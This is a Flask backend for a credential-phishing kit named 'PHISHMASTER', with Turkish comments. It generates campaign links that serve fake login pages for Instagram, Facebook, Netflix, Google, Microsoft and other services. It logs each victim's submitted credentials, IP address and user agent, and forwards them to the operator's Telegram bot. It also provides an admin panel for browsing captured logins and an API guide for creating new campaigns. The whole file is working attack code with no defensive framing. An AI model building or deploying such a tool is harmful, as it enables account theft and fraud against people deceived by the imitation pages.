import os
import json
import sqlite3
import requests
import threading
import random
import string
from datetime import datetime
from flask import Flask, render_template, request, jsonify

app = Flask(__name__, template_folder='templates')
# Render için environment variable'dan secret key al
app.secret_key = os.environ.get("SECRET_KEY", "default-secret-key-for-development")

# Veritabanı bağlantısı - Render'de path düzeltmesi
def get_db_connection():
    conn = sqlite3.connect('phishmaster.db')
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    conn = get_db_connection()
    c = conn.cursor()
    
    # Campaigns tablosu
    c.execute('''CREATE TABLE IF NOT EXISTS campaigns
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  campaign_id TEXT UNIQUE,
                  template_name TEXT,
                  bot_token TEXT,
                  chat_id TEXT,
                  phishing_url TEXT,
                  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                  is_active INTEGER DEFAULT 1,
                  total_visits INTEGER DEFAULT 0,
                  total_submissions INTEGER DEFAULT 0,
                  last_activity TIMESTAMP)''')
    
    # Logs tablosu
    c.execute('''CREATE TABLE IF NOT EXISTS logs
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  campaign_id TEXT,
                  ip_address TEXT,
                  user_agent TEXT,
                  credentials TEXT,
                  captured_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
    
    conn.commit()
    conn.close()

# İlk kurulum
init_db()

# Telegram'a mesaj gönder
def send_telegram_message(bot_token, chat_id, message):
    try:
        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        data = {
            "chat_id": chat_id,
            "text": message,
            "parse_mode": "HTML"
        }
        response = requests.post(url, data=data, timeout=10)
        return response.status_code == 200
    except:
        return False

# Campaign ID oluştur
def generate_campaign_id():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))

# Tüm template dosyalarını otomatik algıla
def get_available_templates():
    templates = []
    template_dir = 'templates'
    
    # Templates klasöründeki tüm .html dosyalarını listele
    excluded_templates = ['admin.html', 'panel.html']
    
    try:
        for filename in os.listdir(template_dir):
            if filename.endswith('.html') and filename not in excluded_templates:
                template_name = filename.replace('.html', '')
                title = template_name.capitalize()
                icon = get_template_icon(template_name)
                templates.append({
                    'name': template_name,
                    'filename': filename,
                    'title': title,
                    'icon': icon
                })
    except FileNotFoundError:
        # templates klasörü yoksa boş liste döndür
        pass
    
    return templates

# Template'e göre ikon belirle
def get_template_icon(template_name):
    icons = {
        'instagram': '📸',
        'facebook': '👥',
        'netfilix': '🎬',
        'netflix': '🎬',
        'tiktok': '🎵',
        'twitter': '🐦',
        'google': '🔍',
        'microsoft': '🪟',
        'spotify': '🎧',
        'steam': '🎮',
        'discord': '👾',
        'paypal': '💳',
        'amazon': '📦',
        'apple': '🍎',
        'epicgames': '🎯',
        'whatsapp': '💬'
    }
    return icons.get(template_name, '🌐')

# Ana sayfa
@app.route('/')
def index():
    return render_template('panel.html')

# Panel
@app.route('/panel')
def panel():
    return render_template('panel.html')

# Template oluşturma endpoint'i
@app.route('/create', methods=['POST'])
def create_campaign():
    data = request.json
    template_name = data.get('template')
    bot_token = data.get('bot_token')
    chat_id = data.get('chat_id')
    
    if not all([template_name, bot_token, chat_id]):
        return jsonify({'error': 'Missing parameters'}), 400
    
    # Template kontrolü
    available_templates = get_available_templates()
    template_names = [t['name'] for t in available_templates]
    
    if template_name not in template_names:
        return jsonify({'error': f'Template not found. Available: {", ".join(template_names)}'}), 400
    
    # Campaign ID oluştur
    campaign_id = generate_campaign_id()
    
    # URL oluştur - Render için base URL düzeltmesi
    base_url = request.host_url.rstrip('/')
    phishing_url = f"{base_url}/{campaign_id}"
    
    # Veritabanına kaydet
    conn = get_db_connection()
    c = conn.cursor()
    c.execute('''INSERT INTO campaigns 
                 (campaign_id, template_name, bot_token, chat_id, phishing_url) 
                 VALUES (?, ?, ?, ?, ?)''',
              (campaign_id, template_name, bot_token, chat_id, phishing_url))
    conn.commit()
    conn.close()
    
    return jsonify({
        'success': True,
        'campaign_id': campaign_id,
        'phishing_url': phishing_url,
        'admin_url': f"{base_url}/admin/{campaign_id}"
    })

# GET API ile link oluşturma
@app.route('/create_link')
def create_campaign_api():
    # GET parametrelerini al
    template_name = request.args.get('template', 'instagram')
    bot_token = request.args.get('token')
    chat_id = request.args.get('id')
    
    # Template adından .html uzantısını çıkar
    if template_name.endswith('.html'):
        template_name = template_name.replace('.html', '')
    
    if not all([bot_token, chat_id]):
        return jsonify({'error': 'Missing parameters. Required: token, id'}), 400
    
    # Mevcut template'leri kontrol et
    available_templates = get_available_templates()
    template_names = [t['name'] for t in available_templates]
    
    # Template kontrolü
    if template_name not in template_names:
        return jsonify({
            'error': f'Template "{template_name}" not found. Available templates: {", ".join(template_names)}'
        }), 400
    
    # Campaign ID oluştur
    campaign_id = generate_campaign_id()
    
    # URL oluştur
    base_url = request.host_url.rstrip('/')
    phishing_url = f"{base_url}/{campaign_id}"
    
    # Veritabanına kaydet
    conn = get_db_connection()
    c = conn.cursor()
    try:
        c.execute('''INSERT INTO campaigns 
                     (campaign_id, template_name, bot_token, chat_id, phishing_url) 
                     VALUES (?, ?, ?, ?, ?)''',
                  (campaign_id, template_name, bot_token, chat_id, phishing_url))
        conn.commit()
        
        # Admin URL'sini oluştur
        admin_url = f"{base_url}/admin/{campaign_id}"
        
        return jsonify({
            'success': True,
            'message': 'Campaign created successfully',
            'data': {
                'campaign_id': campaign_id,
                'template': template_name,
                'phishing_url': phishing_url,
                'admin_url': admin_url,
                'created_at': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                'statistics_url': f"{base_url}/api/campaign/{campaign_id}/stats"
            }
        })
        
    except sqlite3.IntegrityError:
        # Campaign ID çakışması durumunda yeniden dene
        campaign_id = generate_campaign_id()
        c.execute('''INSERT INTO campaigns 
                     (campaign_id, template_name, bot_token, chat_id, phishing_url) 
                     VALUES (?, ?, ?, ?, ?)''',
                  (campaign_id, template_name, bot_token, chat_id, phishing_url))
        conn.commit()
        
        admin_url = f"{base_url}/admin/{campaign_id}"
        
        return jsonify({
            'success': True,
            'message': 'Campaign created successfully',
            'data': {
                'campaign_id': campaign_id,
                'template': template_name,
                'phishing_url': phishing_url,
                'admin_url': admin_url,
                'created_at': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                'statistics_url': f"{base_url}/api/campaign/{campaign_id}/stats"
            }
        })
    finally:
        conn.close()

# HER TEMPLATE İÇİN ÖZEL ENDPOINT'LER
@app.route('/instagram')
def create_instagram():
    bot_token = request.args.get('token')
    chat_id = request.args.get('id')
    
    if not all([bot_token, chat_id]):
        return jsonify({'error': 'Missing parameters. Required: token, id'}), 400
    
    return create_campaign_for_template('instagram', bot_token, chat_id)

@app.route('/facebook')
def create_facebook():
    bot_token = request.args.get('token')
    chat_id = request.args.get('id')
    
    if not all([bot_token, chat_id]):
        return jsonify({'error': 'Missing parameters. Required: token, id'}), 400
    
    return create_campaign_for_template('facebook', bot_token, chat_id)

@app.route('/netflix')
def create_netflix():
    bot_token = request.args.get('token')
    chat_id = request.args.get('id')
    
    if not all([bot_token, chat_id]):
        return jsonify({'error': 'Missing parameters. Required: token, id'}), 400
    
    return create_campaign_for_template('netfilix', bot_token, chat_id)

@app.route('/tiktok')
def create_tiktok():
    bot_token = request.args.get('token')
    chat_id = request.args.get('id')
    
    if not all([bot_token, chat_id]):
        return jsonify({'error': 'Missing parameters. Required: token, id'}), 400
    
    return create_campaign_for_template('tiktok', bot_token, chat_id)

@app.route('/twitter')
def create_twitter():
    bot_token = request.args.get('token')
    chat_id = request.args.get('id')
    
    if not all([bot_token, chat_id]):
        return jsonify({'error': 'Missing parameters. Required: token, id'}), 400
    
    return create_campaign_for_template('twitter', bot_token, chat_id)

@app.route('/google')
def create_google():
    bot_token = request.args.get('token')
    chat_id = request.args.get('id')
    
    if not all([bot_token, chat_id]):
        return jsonify({'error': 'Missing parameters. Required: token, id'}), 400
    
    return create_campaign_for_template('google', bot_token, chat_id)

@app.route('/microsoft')
def create_microsoft():
    bot_token = request.args.get('token')
    chat_id = request.args.get('id')
    
    if not all([bot_token, chat_id]):
        return jsonify({'error': 'Missing parameters. Required: token, id'}), 400
    
    return create_campaign_for_template('microsoft', bot_token, chat_id)

@app.route('/spotify')
def create_spotify():
    bot_token = request.args.get('token')
    chat_id = request.args.get('id')
    
    if not all([bot_token, chat_id]):
        return jsonify({'error': 'Missing parameters. Required: token, id'}), 400
    
    return create_campaign_for_template('spotify', bot_token, chat_id)

# Yardımcı fonksiyon: Template'e göre campaign oluştur
def create_campaign_for_template(template_name, bot_token, chat_id):
    # Campaign ID oluştur
    campaign_id = generate_campaign_id()
    
    # URL oluştur
    base_url = request.host_url.rstrip('/')
    phishing_url = f"{base_url}/{campaign_id}"
    
    # Veritabanına kaydet
    conn = get_db_connection()
    c = conn.cursor()
    
    try:
        c.execute('''INSERT INTO campaigns 
                     (campaign_id, template_name, bot_token, chat_id, phishing_url) 
                     VALUES (?, ?, ?, ?, ?)''',
                  (campaign_id, template_name, bot_token, chat_id, phishing_url))
        conn.commit()
        
        admin_url = f"{base_url}/admin/{campaign_id}"
        
        return jsonify({
            'success': True,
            'message': f'{template_name.capitalize()} campaign created successfully',
            'data': {
                'campaign_id': campaign_id,
                'template': template_name,
                'phishing_url': phishing_url,
                'admin_url': admin_url,
                'created_at': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            }
        })
    except sqlite3.IntegrityError:
        campaign_id = generate_campaign_id()
        c.execute('''INSERT INTO campaigns 
                     (campaign_id, template_name, bot_token, chat_id, phishing_url) 
                     VALUES (?, ?, ?, ?, ?)''',
                  (campaign_id, template_name, bot_token, chat_id, phishing_url))
        conn.commit()
        
        admin_url = f"{base_url}/admin/{campaign_id}"
        
        return jsonify({
            'success': True,
            'message': f'{template_name.capitalize()} campaign created successfully',
            'data': {
                'campaign_id': campaign_id,
                'template': template_name,
                'phishing_url': phishing_url,
                'admin_url': admin_url,
                'created_at': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            }
        })
    finally:
        conn.close()

# Dynamic phishing pages
@app.route('/<campaign_id>')
def phishing_page(campaign_id):
    # Campaign bilgilerini al
    conn = get_db_connection()
    c = conn.cursor()
    c.execute('SELECT template_name, bot_token, chat_id FROM campaigns WHERE campaign_id = ? AND is_active = 1', (campaign_id,))
    campaign = c.fetchone()
    
    if not campaign:
        conn.close()
        return "Sayfa bulunamadı", 404
    
    template_name = campaign['template_name']
    bot_token = campaign['bot_token']
    chat_id = campaign['chat_id']
    
    # Ziyaretçi sayısını güncelle
    c.execute('UPDATE campaigns SET total_visits = total_visits + 1, last_activity = CURRENT_TIMESTAMP WHERE campaign_id = ?', (campaign_id,))
    conn.commit()
    conn.close()
    
    # Template'e göre render et
    template_file = f'{template_name}.html'
    try:
        return render_template(template_file, campaign_id=campaign_id)
    except:
        return f"Template file not found: {template_file}", 404

# Campaign istatistikleri
@app.route('/api/campaign/<campaign_id>/stats')
def campaign_stats(campaign_id):
    conn = get_db_connection()
    c = conn.cursor()
    
    c.execute('SELECT total_visits, total_submissions, created_at, last_activity FROM campaigns WHERE campaign_id = ?', (campaign_id,))
    stats = c.fetchone()
    
    if not stats:
        conn.close()
        return jsonify({'error': 'Campaign not found'}), 404
    
    c.execute('SELECT COUNT(*) FROM logs WHERE campaign_id = ?', (campaign_id,))
    total_logs = c.fetchone()[0]
    
    conn.close()
    
    return jsonify({
        'campaign_id': campaign_id,
        'statistics': {
            'total_visits': stats['total_visits'],
            'total_submissions': stats['total_submissions'],
            'total_logs': total_logs,
            'conversion_rate': f"{(stats['total_submissions']/stats['total_visits']*100):.2f}%" if stats['total_visits'] > 0 else "0%",
            'created_at': stats['created_at'],
            'last_activity': stats['last_activity']
        }
    })

# Credential yakalama endpoint'i
@app.route('/capture/<campaign_id>', methods=['POST'])
def capture_credentials(campaign_id):
    data = request.json
    if not data:
        return jsonify({'error': 'No data provided'}), 400
    
    credentials = json.dumps(data)
    ip_address = request.remote_addr
    user_agent = request.headers.get('User-Agent', 'Unknown')
    
    # Campaign bilgilerini al
    conn = get_db_connection()
    c = conn.cursor()
    c.execute('SELECT bot_token, chat_id FROM campaigns WHERE campaign_id = ?', (campaign_id,))
    campaign = c.fetchone()
    
    if campaign:
        bot_token = campaign['bot_token']
        chat_id = campaign['chat_id']
        
        # Log kaydet
        c.execute('''INSERT INTO logs (campaign_id, ip_address, user_agent, credentials) 
                     VALUES (?, ?, ?, ?)''',
                  (campaign_id, ip_address, user_agent, credentials))
        
        # Submission sayısını güncelle
        c.execute('UPDATE campaigns SET total_submissions = total_submissions + 1 WHERE campaign_id = ?', (campaign_id,))
        conn.commit()
        
        # Telegram'a gönder
        message = f"""🎣 <b>YENİ PHISHING YAKALAMA!</b>

<b>Campaign ID:</b> <code>{campaign_id}</code>
<b>IP Adresi:</b> <code>{ip_address}</code>
<b>Tarih:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

<b>Yakalanan Bilgiler:</b>"""
        
        for key, value in data.items():
            message += f"\n<b>{key}:</b> {value}"
        
        message += f"\n\n<b>User Agent:</b>\n{user_agent}"
        
        # Thread ile gönder (bloklamasın diye)
        def send_async():
            send_telegram_message(bot_token, chat_id, message)
        
        thread = threading.Thread(target=send_async)
        thread.start()
    
    conn.close()
    return jsonify({'success': True})

# Campaign admin paneli
@app.route('/admin/<campaign_id>')
def admin_panel(campaign_id):
    conn = get_db_connection()
    c = conn.cursor()
    
    # Campaign bilgileri
    c.execute('SELECT * FROM campaigns WHERE campaign_id = ?', (campaign_id,))
    campaign = c.fetchone()
    
    if not campaign:
        conn.close()
        return "Campaign bulunamadı", 404
    
    # Loglar
    c.execute('SELECT * FROM logs WHERE campaign_id = ? ORDER BY captured_at DESC LIMIT 100', (campaign_id,))
    logs = c.fetchall()
    
    conn.close()
    
    campaign_data = {
        'id': campaign['campaign_id'],
        'template': campaign['template_name'],
        'bot_token': campaign['bot_token'],
        'chat_id': campaign['chat_id'],
        'url': campaign['phishing_url'],
        'created': campaign['created_at'],
        'active': bool(campaign['is_active']),
        'visits': campaign['total_visits'],
        'submissions': campaign['total_submissions'],
        'last_activity': campaign['last_activity']
    }
    
    logs_data = []
    for log in logs:
        try:
            creds = json.loads(log['credentials'])
        except:
            creds = {}
        
        logs_data.append({
            'id': log['id'],
            'ip': log['ip_address'],
            'user_agent': log['user_agent'],
            'credentials': creds,
            'time': log['captured_at']
        })
    
    return render_template('admin.html', 
                         campaign=campaign_data, 
                         logs=logs_data)

# Tüm campaign'leri listele
@app.route('/api/campaigns')
def list_campaigns():
    conn = get_db_connection()
    c = conn.cursor()
    c.execute('SELECT * FROM campaigns ORDER BY created_at DESC')
    campaigns = c.fetchall()
    conn.close()
    
    result = []
    for camp in campaigns:
        result.append({
            'id': camp['campaign_id'],
            'template': camp['template_name'],
            'bot_token': camp['bot_token'][:10] + '...' if camp['bot_token'] else '',
            'chat_id': camp['chat_id'],
            'url': camp['phishing_url'],
            'created': camp['created_at'],
            'active': bool(camp['is_active']),
            'visits': camp['total_visits'],
            'submissions': camp['total_submissions'],
            'last_activity': camp['last_activity']
        })
    
    return jsonify(result)

# Campaign sil
@app.route('/api/campaign/<campaign_id>/delete', methods=['POST'])
def delete_campaign(campaign_id):
    conn = get_db_connection()
    c = conn.cursor()
    c.execute('DELETE FROM campaigns WHERE campaign_id = ?', (campaign_id,))
    c.execute('DELETE FROM logs WHERE campaign_id = ?', (campaign_id,))
    conn.commit()
    conn.close()
    
    return jsonify({'success': True})

# Campaign aktif/pasif yap
@app.route('/api/campaign/<campaign_id>/toggle', methods=['POST'])
def toggle_campaign(campaign_id):
    conn = get_db_connection()
    c = conn.cursor()
    c.execute('UPDATE campaigns SET is_active = NOT is_active WHERE campaign_id = ?', (campaign_id,))
    conn.commit()
    conn.close()
    
    return jsonify({'success': True})

# Templates listesi
@app.route('/api/templates')
def list_templates():
    available_templates = get_available_templates()
    return jsonify(available_templates)

# Kullanım kılavuzu
@app.route('/api/usage')
def api_usage():
    base_url = request.host_url.rstrip('/')
    available_templates = get_available_templates()
    template_names = [t['name'] for t in available_templates]
    
    return jsonify({
        'api_endpoints': {
            'create_link': {
                'url': f'{base_url}/create_link',
                'method': 'GET',
                'parameters': {
                    'token': 'Telegram bot token (required)',
                    'id': 'Telegram chat ID (required)',
                    'template': f'Template name (optional, default: instagram). Available: {", ".join(template_names)}'
                },
                'example': f'{base_url}/create_link?token=BOT_TOKEN&id=CHAT_ID&template=instagram'
            },
            'specific_endpoints': {
                'description': 'Quick access endpoints for each template',
                'endpoints': [
                    f'{base_url}/instagram?token=BOT_TOKEN&id=CHAT_ID',
                    f'{base_url}/facebook?token=BOT_TOKEN&id=CHAT_ID',
                    f'{base_url}/netflix?token=BOT_TOKEN&id=CHAT_ID',
                    f'{base_url}/tiktok?token=BOT_TOKEN&id=CHAT_ID',
                    f'{base_url}/twitter?token=BOT_TOKEN&id=CHAT_ID'
                ]
            },
            'campaign_stats': {
                'url': f'{base_url}/api/campaign/<campaign_id>/stats',
                'method': 'GET',
                'description': 'Get campaign statistics'
            },
            'list_templates': {
                'url': f'{base_url}/api/templates',
                'method': 'GET',
                'description': 'List all available templates'
            }
        }
    })

# Health check endpoint for Render
@app.route('/health')
def health_check():
    return jsonify({'status': 'healthy', 'timestamp': datetime.now().isoformat()})

if __name__ == '__main__':
    # Render'da PORT environment variable'dan alınır
    port = int(os.environ.get('PORT', 5000))
    
    print("=" * 60)
    print("PHISHMASTER BACKEND - Render Edition")
    print("=" * 60)
    
    # Mevcut template'leri listele
    templates = get_available_templates()
    print(f"\n📁 Available templates ({len(templates)}):")
    for template in templates:
        print(f"  {template['icon']} {template['name']} ({template['filename']})")
    
    print("\n🌐 API Endpoints:")
    print(f"  • GET /create_link?token=BOT_TOKEN&id=CHAT_ID&template=TEMPLATE")
    print(f"  • GET /instagram?token=BOT_TOKEN&id=CHAT_ID")
    print(f"  • GET /facebook?token=BOT_TOKEN&id=CHAT_ID")
    print(f"  • GET /netflix?token=BOT_TOKEN&id=CHAT_ID")
    print(f"  • GET /api/usage - API usage guide")
    print(f"  • GET /api/templates - List all templates")
    print(f"  • GET /health - Health check endpoint")
    print(f"\n🚀 Server running on port {port}")
    print("=" * 60)
    
    app.run(host='0.0.0.0', port=port, debug=False)
